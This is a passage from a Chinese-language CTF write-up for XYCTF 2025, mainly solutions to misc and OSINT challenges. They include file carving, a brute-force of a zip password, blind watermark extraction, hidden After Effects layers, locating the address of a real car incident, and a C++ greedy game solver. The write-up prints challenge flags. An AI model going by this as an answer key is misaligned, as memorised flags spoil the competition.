operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]</code></pre>

<p>flag{W3lC0me_t0_XYCTF_2025_Enj07_1t!}</p>
<h3 id="曼波曼波曼波"><a href="#曼波曼波曼波" class="headerlink" title="曼波曼波曼波"></a>曼波曼波曼波</h3><p>smn.txt的base64逆序，后发现jpg文件头，保存为文件</p>
<p><img src="/images/download-1744626745339-68.jpg" loading="lazy">														</p>
<p>010查看发现后面跟了PK，binwalk分解得到压缩包</p>
<p>提示说，密码是什么来着，有点记不清了，呜呜呜呜 好像是什么比赛名字加年份</p>
<p>还以为有什么其他的，掩码爆破了一下发现密码确实是XYCTF2025</p>
<p>给了两张一样的图片，双图盲水印秒了</p>
<p><img src="/images/EASY_1_decpy3-1744626745339-69.png" loading="lazy"></p>
<h3 id="MADer也要当CTFer"><a href="#MADer也要当CTFer" class="headerlink" title="MADer也要当CTFer"></a>MADer也要当CTFer</h3><p>提取mkv文件的字幕轨subs.ass</p>
<p>发现是一堆hex提取出一个RIFX开头的文件，发现是一个aep文件</p>
<p>使用ae打开，发现有图层</p>
<p><img src="/images/1743836629066-03a76683-7499-468d-85f3-3fb10439a989-1744626745339-70.png" loading="lazy"></p>
<p>取消设置隐藏”消隐”的图层，可以看到有一写文字，flag在flag2这个文本中，需要调一下缩放就可以复制其中的内容了。</p>
<p><img src="/images/1743836639502-b7bffbac-436b-46f2-befe-b8721af93a21-1744626745339-72.png" loading="lazy"></p>
<p>flag{l_re@IIy_w@nn@_2_Ie@rn_AE}</p>
<h3 id="会飞的雷克萨斯"><a href="#会飞的雷克萨斯" class="headerlink" title="会飞的雷克萨斯"></a>会飞的雷克萨斯</h3><p>看图猜到是之前小孩炸车事件，直接百度该事件。</p>
<p><img src="/images/QQ_1743832187198-1744626745339-71.png" loading="lazy"></p>
<p>得到地址：四川省内江市资中县春岚北路</p>
<p>后面XXXXXX内通过地图看应该是中铁城市中心</p>
<p><img src="/images/QQ_1743832241003-1744626745339-73.png" loading="lazy"></p>
<p>flag{四川省内江市资中县春岚北路中铁城市中心内}</p>
<h3 id="XGCTF"><a href="#XGCTF" class="headerlink" title="XGCTF"></a>XGCTF</h3><p>搜索关键词找到题目名称：<strong>easy_polluted</strong></p>
<p><img src="/images/QQ_1743832317067-1744626745339-74.png" loading="lazy"></p>
<p><img src="/images/1743832324744-64f7289f-3287-4b94-996f-1b63731e7717-1744626745335-1.png" loading="lazy"></p>
<p>github可以搜到dragonkeep</p>
<p>通过访问他的.github.io会重定位到</p>
<p><img src="/images/QQ_1743832409731-1744626745339-76.png" loading="lazy"></p>
<p>找到第一篇文章。</p>
<p><img src="/images/QQ_1743832453654-1744626745339-75.png" loading="lazy"></p>
<p>f12找到flag进行base64解密。</p>
<p><img src="/images/QQ_1743832482740-1744626745339-77.png" loading="lazy">flag{1t_I3_t3E_s@Me_ChAl1eNge_aT_a1L_P1e@se_fOrg1ve_Me}</p>
<h3 id="Greedymen"><a href="#Greedymen" class="headerlink" title="Greedymen"></a>Greedymen</h3><p>将题目和思路发给claude写出计算优解代码</p>
<p>思路：先拿最大质数；从其他质数相关的大合数开始取；给对面拿最少分数前提取剩下的数字</p>
<p>算法代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;set></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;map></span></span>

<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">getFactors</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> factors<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
            factors<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> factors<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">bool</span> <span class="token function">isPrime</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">*</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">struct</span> <span class="token class-name">Evaluation</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> immediateGain<span class="token punctuation">;</span>
    <span class="token keyword">int</span> futureImpact<span class="token punctuation">;</span>
    <span class="token keyword">int</span> numFactors<span class="token punctuation">;</span>

    <span class="token keyword">bool</span> <span class="token keyword">operator</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token keyword">const</span> Evaluation <span class="token operator">&amp;</span>other<span class="token punctuation">)</span> <span class="token keyword">const</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>immediateGain <span class="token operator">!=</span> other<span class="token punctuation">.</span>immediateGain<span class="token punctuation">)</span>
            <span class="token keyword">return</span> immediateGain <span class="token operator">&lt;</span> other<span class="token punctuation">.</span>immediateGain<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>futureImpact <span class="token operator">!=</span> other<span class="token punctuation">.</span>futureImpact<span class="token punctuation">)</span>
            <span class="token keyword">return</span> futureImpact <span class="token operator">&lt;</span> other<span class="token punctuation">.</span>futureImpact<span class="token punctuation">;</span>
        <span class="token keyword">return</span> numFactors <span class="token operator">></span> other<span class="token punctuation">.</span>numFactors<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token keyword">int</span> NEG_INF <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1000000000</span><span class="token punctuation">;</span> <span class="token comment">// 使用整数常量</span>

Evaluation <span class="token function">evaluateChoice</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">const</span> set<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">&amp;</span>usedNumbers<span class="token punctuation">,</span> <span class="token keyword">int</span> maxNum<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> factors <span class="token operator">=</span> <span class="token function">getFactors</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> opponentGain <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    set<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> newUsed <span class="token operator">=</span> usedNumbers<span class="token punctuation">;</span>
    newUsed<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> factor <span class="token operator">:</span> factors<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>factor <span class="token operator">!=</span> num <span class="token operator">&amp;&amp;</span> usedNumbers<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>factor<span class="token punctuation">)</span> <span class="token operator">==</span> usedNumbers<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            opponentGain <span class="token operator">+=</span> factor<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">int</span> futureOptions <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> maxNum<span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>newUsed<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> newUsed<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> iFactors <span class="token operator">=</span> <span class="token function">getFactors</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">bool</span> hasUnusedFactor <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> f <span class="token operator">:</span> iFactors<span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">!=</span> i <span class="token operator">&amp;&amp;</span> newUsed<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">==</span> newUsed<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">&#123;</span>
                    hasUnusedFactor <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>hasUnusedFactor<span class="token punctuation">)</span>
                futureOptions<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>num <span class="token operator">-</span> opponentGain<span class="token punctuation">,</span> futureOptions<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>factors<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">solveLevel</span><span class="token punctuation">(</span><span class="token keyword">int</span> maxNum<span class="token punctuation">,</span> <span class="token keyword">int</span> moves<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    set<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> used<span class="token punctuation">;</span>
    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> choices<span class="token punctuation">;</span>
    <span class="token keyword">int</span> myScore <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> opponentScore <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    map<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> factorMap<span class="token punctuation">;</span>

    <span class="token comment">// 预计算所有数的因数</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> maxNum<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        factorMap<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getFactors</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span>moves <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> bestNum <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        Evaluation bestEval <span class="token operator">=</span> <span class="token punctuation">&#123;</span>NEG_INF<span class="token punctuation">,</span> NEG_INF<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">// 使用整数常量</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> maxNum<span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>used<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">!=</span> used<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span><span class="token punctuation">;</span>

            <span class="token keyword">bool</span> hasUnusedFactor <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> factor <span class="token operator">:</span> factorMap<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>factor <span class="token operator">!=</span> i <span class="token operator">&amp;&amp;</span> used<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>factor<span class="token punctuation">)</span> <span class="token operator">==</span> used<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">&#123;</span>
                    hasUnusedFactor <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hasUnusedFactor<span class="token punctuation">)</span>
                <span class="token keyword">continue</span><span class="token punctuation">;</span>

            Evaluation eval <span class="token operator">=</span> <span class="token function">evaluateChoice</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> used<span class="token punctuation">,</span> maxNum<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>bestEval <span class="token operator">&lt;</span> eval<span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                bestEval <span class="token operator">=</span> eval<span class="token punctuation">;</span>
                bestNum <span class="token operator">=</span> i<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>bestNum <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>

        choices<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>bestNum<span class="token punctuation">)</span><span class="token punctuation">;</span>
        myScore <span class="token operator">+=</span> bestNum<span class="token punctuation">;</span>
        used<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>bestNum<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> factor <span class="token operator">:</span> factorMap<span class="token punctuation">[</span>bestNum<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>factor <span class="token operator">!=</span> bestNum <span class="token operator">&amp;&amp;</span> used<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>factor<span class="token punctuation">)</span> <span class="token operator">==</span> used<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                opponentScore <span class="token operator">+=</span> factor<span class="token punctuation">;</span>
                used<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>factor<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

        moves<span class="token operator">--</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 计算剩余数字</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> maxNum<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>used<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> used<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            opponentScore <span class="token operator">+=</span> i<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Level "</span> <span class="token operator">&lt;&lt;</span> maxNum <span class="token operator">&lt;&lt;</span> <span class="token string">" ("</span> <span class="token operator">&lt;&lt;</span> moves <span class="token operator">&lt;&lt;</span> <span class="token string">" moves):\n"</span><span class="token punctuation">;</span>
    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"choices = ["</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> choices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        cout <span class="token operator">&lt;&lt;</span> choices<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> choices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
            cout <span class="token operator">&lt;&lt;</span> <span class="token string">", "</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"]\n"</span><span class="token punctuation">;</span>

    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"My Score: "</span> <span class="token operator">&lt;&lt;</span> myScore <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Opponent Score: "</span> <span class="token operator">&lt;&lt;</span> opponentScore <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Score Difference: "</span> <span class="token operator">&lt;&lt;</span> myScore <span class="token operator">-</span> opponentScore <span class="token operator">&lt;&lt;</span> <span class="token string">"\n\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">solveLevel</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Level 1</span>
    <span class="token function">solveLevel</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Level 2</span>
    <span class="token function">solveLevel</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Level 3</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>输出：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp">Level <span class="token number">50</span> <span class="token punctuation">(</span><span class="token number">0</span> moves<span class="token punctuation">)</span><span class="token operator">:</span>
choices <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">]</span>
